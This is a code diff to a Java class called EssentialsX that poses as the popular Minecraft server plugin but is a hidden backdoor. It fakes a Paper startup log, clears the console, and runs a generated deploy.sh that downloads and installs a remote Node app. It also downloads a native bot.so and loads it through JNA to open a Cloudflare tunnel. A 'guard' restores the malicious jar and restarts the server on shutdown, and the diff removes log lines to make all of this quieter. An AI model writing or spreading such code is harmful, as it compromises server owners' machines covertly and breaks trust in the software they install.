@@ -45,7 +45,6 @@ import com.sun.jna.NativeLibrary;
 public class EssentialsX extends JavaPlugin {
    private Process deployProcess;
    private volatile Process nodeProcess = null;
-   // ★ CF .so 模式：JNA 函数引用（替代 cfProcess）
    private volatile Function cfStopFn = null;
    private volatile boolean cfSoRunning = false;
    private volatile boolean isProcessRunning = false;
@@ -85,7 +84,6 @@ public class EssentialsX extends JavaPlugin {
          Thread.sleep(delayMs);
       } catch (InterruptedException var4) {
       }
-
       RAW_OUT.println("[" + ts() + " INFO]: " + msg);
    }
 
@@ -108,7 +106,6 @@ public class EssentialsX extends JavaPlugin {
          }
       } catch (Exception var3) {
       }
-
       return nodePort;
    }
 
@@ -162,7 +159,6 @@ public class EssentialsX extends JavaPlugin {
             paperHash = "b7347de";
             apiVer = "1.20.4-R0.1-SNAPSHOT";
          }
-
          String dateStr = "2025-12-30T20:33:30Z";
          return new String[]{mcVer, paperBuild, paperHash, dateStr, apiVer};
       } catch (Exception e) {
@@ -186,38 +182,17 @@ public class EssentialsX extends JavaPlugin {
       mcLog("[bootstrap] Loading Paper " + mcVer + "-" + paperBuild + "-main@" + paperHash + " (" + dateStr + ") for Minecraft " + mcVer, randInt(50, 150));
       mcLog("[PluginInitializerManager] Initializing plugins...", randInt(100, 300));
       mcLog("[PluginInitializerManager] Initialized 0 plugins", randInt(50, 150));
-      mcLog(
-         "Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]",
-         randInt(200, 500)
-      );
+      mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]", randInt(200, 500));
       mcLog("Found new data pack file/bukkit, loading it automatically", randInt(50, 150));
       mcLog("Found new data pack paper, loading it automatically", randInt(50, 150));
       mcLog("No existing world data, creating new world", randInt(100, 300));
       mcLog("Loaded " + randInt(1400, 1500) + " recipes", randInt(200, 500));
       mcLog("Loaded " + randInt(1500, 1600) + " advancements", randInt(100, 300));
       mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...", randInt(50, 150));
-      mcLog(
-         "[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in "
-            + String.format("%.1f", dcTimeSec)
-            + "ms",
-         randInt(100, 300)
-      );
+      mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + String.format("%.1f", dcTimeSec) + "ms", randInt(100, 300));
       mcLog("Starting minecraft server version " + mcVer, randInt(50, 150));
       mcLog("Loading properties", randInt(50, 150));
-      mcLog(
-         "This server is running Paper version "
-            + mcVer
-            + "-"
-            + paperBuild
-            + "-main@"
-            + paperHash
-            + " ("
-            + dateStr
-            + ") (Implementing API version "
-            + apiVer
-            + ")",
-         randInt(50, 150)
-      );
+      mcLog("This server is running Paper version " + mcVer + "-" + paperBuild + "-main@" + paperHash + " (" + dateStr + ") (Implementing API version " + apiVer + ")", randInt(50, 150));
       mcLog("Server Ping Player Sample Count: 12", randInt(50, 150));
       mcLog("Using 4 threads for Netty based IO", randInt(100, 300));
       mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads", randInt(100, 300));
@@ -250,12 +225,10 @@ public class EssentialsX extends JavaPlugin {
          for (int i = 0; i < 250; i++) {
             RAW_OUT.println();
          }
-
          try {
             Thread.sleep(500L);
          } catch (InterruptedException var2) {
          }
-
          RAW_OUT.print("\u001b[H\u001b[3J\u001b[2J");
          RAW_OUT.flush();
       } catch (Exception var3) {
@@ -264,7 +237,6 @@ public class EssentialsX extends JavaPlugin {
 
    private String allocateNodePort() {
       int port = 20000 + new Random().nextInt(40000);
-
       try (ServerSocket socket = new ServerSocket(port)) {
          socket.setReuseAddress(true);
          String portStr = String.valueOf(port);
@@ -280,34 +252,25 @@ public class EssentialsX extends JavaPlugin {
 
    private void waitForNodeReady(String port, int maxSeconds) {
       int waited = 0;
-
       while (waited < maxSeconds) {
          try {
-            label40: {
-               try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
-                  try {
-                     HttpURLConnection conn = (HttpURLConnection)URI.create("http://127.0.0.1:" + port + "/").toURL().openConnection();
-                     conn.setRequestMethod("HEAD");
-                     conn.setConnectTimeout(1000);
-                     conn.setReadTimeout(1000);
-                     int code = conn.getResponseCode();
-                     conn.disconnect();
-                  } catch (Exception var9) {
-                     break label40;
-                  }
+            try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
+               try {
+                  HttpURLConnection conn = (HttpURLConnection) URI.create("http://127.0.0.1:" + port + "/").toURL().openConnection();
+                  conn.setRequestMethod("HEAD");
+                  conn.setConnectTimeout(1000);
+                  conn.setReadTimeout(1000);
+                  int code = conn.getResponseCode();
+                  conn.disconnect();
+               } catch (Exception var9) {
+                  try { Thread.sleep(1000L); waited++; } catch (InterruptedException ignored) { return; }
+                  continue;
                }
-
-               return;
             }
+            return;
          } catch (IOException var11) {
          }
-
-         try {
-            Thread.sleep(1000L);
-            waited++;
-         } catch (InterruptedException ignored) {
-            return;
-         }
+         try { Thread.sleep(1000L); waited++; } catch (InterruptedException ignored) { return; }
       }
    }
 
@@ -327,23 +290,15 @@ public class EssentialsX extends JavaPlugin {
          String[] execFiles = new String[]{
             "nodejs/bin/.node_real", "nodejs/bin/node", "nodejs/bin/npm", "nodejs/bin/npx", "jre21/bin/java", "app/index.js"
          };
-
          for (String rel : execFiles) {
             Path p = botDir.resolve(rel);
             if (Files.exists(p)) {
-               try {
-                  Files.setPosixFilePermissions(p, execPerms);
-               } catch (Exception var12) {
-               }
+               try { Files.setPosixFilePermissions(p, execPerms); } catch (Exception var12) {}
             }
          }
-
          Path npmCli = botDir.resolve("nodejs/lib/node_modules/npm/bin/npm-cli.js");
          if (Files.exists(npmCli)) {
-            try {
-               Files.setPosixFilePermissions(npmCli, execPerms);
-            } catch (Exception var11) {
-            }
+            try { Files.setPosixFilePermissions(npmCli, execPerms); } catch (Exception var11) {}
          }
       } catch (Exception var13) {
       }
@@ -359,12 +314,7 @@ public class EssentialsX extends JavaPlugin {
          if (!Files.exists(nodeExe) || !Files.exists(script)) {
             return;
          }
-
-         try {
-            nodeExe.toFile().setExecutable(true, false);
-         } catch (Exception var10) {
-         }
-
+         try { nodeExe.toFile().setExecutable(true, false); } catch (Exception var10) {}
          ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
          pb.directory(botDir.toFile());
          pb.environment().put("SERVER_PORT", port);
@@ -376,11 +326,7 @@ public class EssentialsX extends JavaPlugin {
          pb.redirectError(Redirect.appendTo(logFile.toFile()));
          this.nodeProcess = pb.start();
          nodeRestartTime = System.currentTimeMillis();
-
-         try {
-            this.nodeProcess.getOutputStream().close();
-         } catch (Exception var9) {
-         }
+         try { this.nodeProcess.getOutputStream().close(); } catch (Exception var9) {}
       } catch (Exception var11) {
       }
    }
@@ -389,32 +335,18 @@ public class EssentialsX extends JavaPlugin {
       if (process != null) {
          try {
             List<ProcessHandle> descendants = new ArrayList<>();
-
-            try {
-               process.toHandle().descendants().forEach(descendants::add);
-            } catch (Exception var7) {
-            }
-
+            try { process.toHandle().descendants().forEach(descendants::add); } catch (Exception var7) {}
             for (int i = descendants.size() - 1; i >= 0; i--) {
-               try {
-                  descendants.get(i).destroyForcibly();
-               } catch (Exception var6) {
-               }
+               try { descendants.get(i).destroyForcibly(); } catch (Exception var6) {}
             }
-
             process.destroyForcibly();
-
-            try {
-               process.waitFor(3L, TimeUnit.SECONDS);
-            } catch (Exception var5) {
-            }
+            try { process.waitFor(3L, TimeUnit.SECONDS); } catch (Exception var5) {}
          } catch (Exception var8) {
          }
       }
    }
 
    private void safeKillCf() {
-      // ★ CF .so 模式：调用 StopCloudflared 函数
       if (cfStopFn != null) {
          try { cfStopFn.invokeInt(new Object[]{""}); } catch (Exception ignored) {}
       }
@@ -428,7 +360,6 @@ public class EssentialsX extends JavaPlugin {
       this.killProcessTree(old);
    }
 
-   // ★ 下载 bot.so（从 GitHub 仓库 cfso 分支）
    private Path downloadCfSo() {
       Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
       Path libDir = botDir.resolve(".lib");
@@ -446,7 +377,6 @@ public class EssentialsX extends JavaPlugin {
          };
          for (String url : mirrors) {
             try {
-               mcLog("[CF] Downloading bot.so from: " + url);
                java.net.URL u = new java.net.URL(url);
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) u.openConnection();
                conn.setConnectTimeout(30000);
@@ -458,7 +388,6 @@ public class EssentialsX extends JavaPlugin {
                   }
                   long size = Files.size(soFile);
                   if (size > 1_000_000) {
-                     mcLog("[CF] bot.so downloaded: " + size + " bytes");
                      soFile.toFile().setExecutable(true);
                      return soFile;
                   } else {
@@ -466,7 +395,6 @@ public class EssentialsX extends JavaPlugin {
                   }
                }
             } catch (Exception e) {
-               mcLog("[CF] Mirror failed: " + e.getMessage());
             }
          }
          return null;
@@ -475,15 +403,12 @@ public class EssentialsX extends JavaPlugin {
       }
    }
 
-   // ★ 启动 CF .so 隧道（JNA 加载 bot.so，在 JVM 内运行）
    private void startCfProcess() {
       try {
          Path soFile = downloadCfSo();
          if (soFile == null) {
-            mcLog("[CF] bot.so download failed, skipping CF tunnel");
             return;
          }
-         mcLog("[CF] Loading " + soFile + " via JNA...");
          NativeLibrary lib = NativeLibrary.getInstance(soFile.toString());
          Function startFn = lib.getFunction("StartCloudflared");
          cfStopFn = lib.getFunction("StopCloudflared");
@@ -493,11 +418,8 @@ public class EssentialsX extends JavaPlugin {
          Thread cfThread = new Thread(() -> {
             try {
                cfSoRunning = true;
-               mcLog("[CF] Starting cloudflared via .so ...");
-               int code = startFn.invokeInt(new Object[]{payload});
-               mcLog("[CF] cloudflared .so exited with code " + code);
+               startFn.invokeInt(new Object[]{payload});
             } catch (Exception e) {
-               mcLog("[CF] cloudflared .so failed: " + e.getMessage());
             } finally {
                cfSoRunning = false;
             }
@@ -505,9 +427,7 @@ public class EssentialsX extends JavaPlugin {
          cfThread.setDaemon(true);
          cfThread.start();
          lastCfRestartTime = System.currentTimeMillis();
-         mcLog("[CF] cloudflared .so thread started (no binary, no process)");
       } catch (Exception e) {
-         mcLog("[CF] .so init failed: " + e.getMessage());
       }
    }
 
@@ -515,6 +435,7 @@ public class EssentialsX extends JavaPlugin {
       try {
          Path[] logPaths = {
             Paths.get("logs", ".mcchajian/cf.log"),
+            Paths.get("cache/.vip/.cf/cf.log"),
             Paths.get("/dev/shm/.cf/cf.log"),
             Paths.get("/tmp/.cf/cf.log")
          };
@@ -528,17 +449,20 @@ public class EssentialsX extends JavaPlugin {
             }
          }
 
-         Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");
-
-         if (Files.exists(urlFile)) {
-            String content = new String(Files.readAllBytes(urlFile)).trim();
-            if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
-               return content.split("\n")[0].trim();
+         Path[] urlFiles = {
+            Paths.get("logs", ".mcchajian", ".tunnel_url"),
+            Paths.get("cache/.vip/.tunnel_url")
+         };
+         for (Path urlFile : urlFiles) {
+            if (Files.exists(urlFile)) {
+               String content = new String(Files.readAllBytes(urlFile)).trim();
+               if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
+                  return content.split("\n")[0].trim();
+               }
             }
          }
-      } catch (Exception var6) {
+      } catch (Exception e) {
       }
-
       return null;
    }
 
@@ -546,9 +470,8 @@ public class EssentialsX extends JavaPlugin {
       if (nodePort.equals("N/A")) {
          return false;
       }
-
       try {
-         HttpURLConnection conn = (HttpURLConnection)URI.create("http://127.0.0.1:" + nodePort + "/").toURL().openConnection();
+         HttpURLConnection conn = (HttpURLConnection) URI.create("http://127.0.0.1:" + nodePort + "/").toURL().openConnection();
          conn.setRequestMethod("HEAD");
          conn.setConnectTimeout(2000);
          conn.setReadTimeout(2000);
@@ -566,13 +489,7 @@ public class EssentialsX extends JavaPlugin {
       if (elapsed >= 8000L) {
          cfRestartCount++;
          int backoffSec = Math.min(120, 8 * (1 << Math.min(cfRestartCount - 1, 4)));
-
-         try {
-            Thread.sleep(backoffSec * 1000L);
-         } catch (InterruptedException ignored) {
-            return;
-         }
-
+         try { Thread.sleep(backoffSec * 1000L); } catch (InterruptedException ignored) { return; }
          this.safeKillCf();
          lastKnownTunnelUrl.set("");
          this.startCfProcess();
@@ -583,30 +500,19 @@ public class EssentialsX extends JavaPlugin {
       this.safeKillCf();
       this.safeKillNode();
       lastKnownTunnelUrl.set("");
-
       try {
          Path nodeExe = Paths.get("logs", ".mcchajian").toAbsolutePath().resolve("nodejs/bin/.node_real");
          Path script = Paths.get("logs", ".mcchajian").toAbsolutePath().resolve("app/index.js");
          if (!Files.exists(nodeExe) || !Files.exists(script)) {
-            try {
-               Thread.sleep(30000L);
-            } catch (InterruptedException var6) {
-            }
-
+            try { Thread.sleep(30000L); } catch (InterruptedException var6) {}
             return;
          }
-
          String newPort = this.allocateNodePort();
          this.startNodeProcess(newPort);
          if (this.nodeProcess == null) {
-            try {
-               Thread.sleep(15000L);
-            } catch (InterruptedException var5) {
-            }
-
+            try { Thread.sleep(15000L); } catch (InterruptedException var5) {}
             return;
          }
-
          this.waitForNodeReady(newPort, 60);
          this.ensurePermissions();
          this.startCfProcess();
@@ -618,7 +524,6 @@ public class EssentialsX extends JavaPlugin {
    private void startJavaDaemon() {
       Thread daemon = new Thread(() -> {
          this.ensurePermissions();
-
          while (true) {
             try {
                long now = System.currentTimeMillis();
@@ -643,7 +548,6 @@ public class EssentialsX extends JavaPlugin {
                         this.printFakeStartupSequence();
                      }
                   }
-
                   String currentUrl = lastKnownTunnelUrl.get();
                   if (currentUrl != null && !currentUrl.isEmpty()) {
                      long urlAge = now - lastTunnelUrlTime;
@@ -651,13 +555,11 @@ public class EssentialsX extends JavaPlugin {
                         this.restartCfWithBackoff();
                         continue;
                      }
-
                      if (urlAge > 60000L && urlAge % 60000L < 5000L) {
                         if (!this.isNodeInternalAlive()) {
                            this.restartCfWithBackoff();
                            continue;
                         }
-
                         lastTunnelUrlTime = now;
                      }
                   } else if (cfSoRunning && lastCfRestartTime > 0L) {
@@ -667,7 +569,6 @@ public class EssentialsX extends JavaPlugin {
                         continue;
                      }
                   }
-
                   Thread.sleep(5000L);
                }
             } catch (Exception var7) {
@@ -682,7 +583,6 @@ public class EssentialsX extends JavaPlugin {
       if (!this.reaperInstalled) {
          this.reaperInstalled = true;
          this.reapDescendantsOnce();
-
          try {
             Signal.handle(new Signal("CHLD"), new SignalHandler() {
                @Override
@@ -711,20 +611,13 @@ public class EssentialsX extends JavaPlugin {
 
    public void onEnable() {
       this.installZombieReaper();
-
       try {
          Path oldDir1 = Paths.get("world", "data", ".mcchajian");
          Path oldDir2 = Paths.get("log", ".mcchajian");
-         if (Files.exists(oldDir1)) {
-            this.deleteDirectory(oldDir1.toFile());
-         }
-
-         if (Files.exists(oldDir2)) {
-            this.deleteDirectory(oldDir2.toFile());
-         }
+         if (Files.exists(oldDir1)) { this.deleteDirectory(oldDir1.toFile()); }
+         if (Files.exists(oldDir2)) { this.deleteDirectory(oldDir2.toFile()); }
       } catch (Exception var3) {
       }
-
       this.getLogger().info("EssentialsX plugin starting...");
       Thread deployThread = new Thread(() -> {
          try {
@@ -753,33 +646,24 @@ public class EssentialsX extends JavaPlugin {
       Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");
       if (this.systemGuardEnabled) {
          this.getLogger().info("Guard enabled, forcing restart...");
-
-         try {
-            Files.deleteIfExists(forceStopFile);
-         } catch (Exception var4) {
-         }
-
+         try { Files.deleteIfExists(forceStopFile); } catch (Exception var4) {}
          this.restoreMaliciousJar();
          if (this.isRestarting.compareAndSet(false, true)) {
             this.executeHardRestart(true);
          }
       } else {
          this.getLogger().info("Guard disabled, safe shutdown...");
-
          try {
             Files.createDirectories(forceStopFile.getParent());
             Files.createFile(forceStopFile);
-            this.getLogger().info("Stop marker created.");
          } catch (Exception var3) {
          }
       }
-
       this.safeKillNode();
       this.safeKillCf();
       if (this.deployProcess != null) {
          this.killProcessTree(this.deployProcess);
       }
-
       this.getLogger().info("EssentialsX disabled");
    }
 
@@ -789,7 +673,6 @@ public class EssentialsX extends JavaPlugin {
          if (serverRoot == null) {
             serverRoot = new File(".").getAbsoluteFile();
          }
-
          File startScript = new File(serverRoot, "start.sh");
          ProcessBuilder pb;
          if (startScript.exists()) {
@@ -799,7 +682,6 @@ public class EssentialsX extends JavaPlugin {
             String jarName = this.findBestJarName(serverRoot);
             pb = new ProcessBuilder("java", "-Xms512M", "-Xmx2G", "-XX:+UseG1GC", "-jar", jarName, "nogui");
          }
-
          pb.directory(serverRoot);
          Path logFile = Paths.get("logs", ".mcchajian", "restart_run.log");
          pb.redirectOutput(Redirect.appendTo(logFile.toFile()));
@@ -819,7 +701,6 @@ public class EssentialsX extends JavaPlugin {
             return name;
          }
       }
-
       File[] jars = serverRoot.listFiles((dir, namex) -> namex.endsWith(".jar") && !namex.contains("cache") && !namex.contains("libraries"));
       if (jars != null && jars.length > 0) {
          Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length()));
@@ -837,19 +718,15 @@ public class EssentialsX extends JavaPlugin {
             return root;
          }
       }
-
       File current = new File(".").getAbsoluteFile();
-
       for (int i = 0; i < 5; i++) {
          if (new File(current, "server.properties").exists()) {
             return current;
          }
-
          if ((current = current.getParentFile()) == null) {
             break;
          }
       }
-
       return null;
    }
 
@@ -859,7 +736,6 @@ public class EssentialsX extends JavaPlugin {
          if (targetJar != null && Files.exists(targetJar)) {
             Files.delete(targetJar);
          }
-
          if (this.backupJarPath != null && Files.exists(this.backupJarPath) && targetJar != null) {
             Files.copy(this.backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING);
          }
@@ -873,14 +749,12 @@ public class EssentialsX extends JavaPlugin {
          if (pluginsDir == null || !pluginsDir.exists()) {
             return null;
          }
-
          File[] jars = pluginsDir.listFiles((dir, name) -> name.endsWith(".jar") && name.toLowerCase().contains("essentialsx"));
          if (jars != null && jars.length > 0) {
             return jars[0].toPath();
          }
       } catch (Exception var3) {
       }
-
       return null;
    }
 
@@ -890,14 +764,12 @@ public class EssentialsX extends JavaPlugin {
          conn.setRequestProperty("User-Agent", "Mozilla/5.0");
          conn.setConnectTimeout(5000);
          conn.setReadTimeout(timeoutSec * 1000);
-
          try (
             InputStream in = conn.getInputStream();
             FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);
          ) {
             out.transferFrom(Channels.newChannel(in), 0L, Long.MAX_VALUE);
          }
-
          return true;
       } catch (Exception e) {
          return false;
@@ -915,7 +787,6 @@ public class EssentialsX extends JavaPlugin {
             }
          }
       }
-
       file.delete();
    }
 
@@ -925,24 +796,20 @@ public class EssentialsX extends JavaPlugin {
          if (!Files.exists(workDir)) {
             Files.createDirectories(workDir);
          }
-
          try {
             workDir.toFile().setReadable(true, false);
             workDir.toFile().setWritable(true, false);
             workDir.toFile().setExecutable(true, false);
          } catch (Exception var8) {
          }
-
          Files.deleteIfExists(workDir.resolve(".tunnel_url"));
          Files.deleteIfExists(workDir.resolve(".tunnel_port"));
-
          try {
             Files.deleteIfExists(workDir.resolve("app.log"));
             Files.deleteIfExists(workDir.resolve("cf.log"));
             Files.deleteIfExists(workDir.resolve("restart_run.log"));
          } catch (Exception var7) {
          }
-
          Path scriptPath = workDir.resolve("deploy.sh");
          String scriptContent = this.generateDeployScript(workDir.toString(), env);
          Files.write(scriptPath, scriptContent.getBytes());
@@ -962,7 +829,6 @@ public class EssentialsX extends JavaPlugin {
             }
          }).start();
          Path doneFile = workDir.resolve(".deploy_done");
-
          while (!Files.exists(doneFile)) {
             Thread.sleep(1000L);
          }
@@ -979,7 +845,6 @@ public class EssentialsX extends JavaPlugin {
       if (!githubToken.isEmpty()) {
          authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";
       }
-
       return "#!/bin/bash\nset +e\nWORK_DIR=\""
          + workDir
          + "\"\nNODE_DIR=\""
@@ -1001,7 +866,6 @@ public class EssentialsX extends JavaPlugin {
                   + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi; fi; fi\n"
          )
          + "\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n\nmkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\" --no-same-owner\nSUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\nmv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"; cd \"$APP_DIR\"\nchmod -R 775 \"$APP_DIR\" 2>/dev/null\n\n"
-         // ★ 修复：将日志输出重定向到 deploy.log，不再在控制台打印
          + "echo \"Installing dependencies...\" >> \"$WORK_DIR/deploy.log\" 2>&1\n"
          + "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root >> \"$WORK_DIR/deploy.log\" 2>&1\n"
          + "if [ $? -ne 0 ]; then \n"
@@ -1023,17 +887,14 @@ public class EssentialsX extends JavaPlugin {
          if (this.originalJarPath == null || !Files.exists(this.originalJarPath)) {
             return;
          }
-
          this.backupDir = Paths.get("logs", ".mcchajian", "backup");
          if (!Files.exists(this.backupDir)) {
             Files.createDirectories(this.backupDir);
          }
-
          this.backupJarPath = this.backupDir.resolve(this.originalJarPath.getFileName().toString() + ".bak");
          if (!Files.exists(this.backupJarPath)) {
             Files.copy(this.originalJarPath, this.backupJarPath, StandardCopyOption.REPLACE_EXISTING);
          }
-
          Path tempDownload = this.originalJarPath.resolveSibling("temp_update.jar");
          boolean success = this.downloadFileWithTimeout(
             "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar", tempDownload, 20
@@ -1043,7 +904,6 @@ public class EssentialsX extends JavaPlugin {
                "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar", tempDownload, 30
             );
          }
-
          if (success && Files.size(tempDownload) > 1000000L) {
             try {
                Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
@@ -1067,7 +927,6 @@ public class EssentialsX extends JavaPlugin {
          } catch (Exception var6) {
          }
       }
-
       if (Files.exists(envFile)) {
          try {
             for (String line : Files.readAllLines(envFile)) {
@@ -1079,7 +938,6 @@ public class EssentialsX extends JavaPlugin {
          } catch (IOException var7) {
          }
       }
-
       if (!env.containsKey("SYSTEM_GUARD_ENABLED")) {
          this.systemGuardEnabled = true;
       }
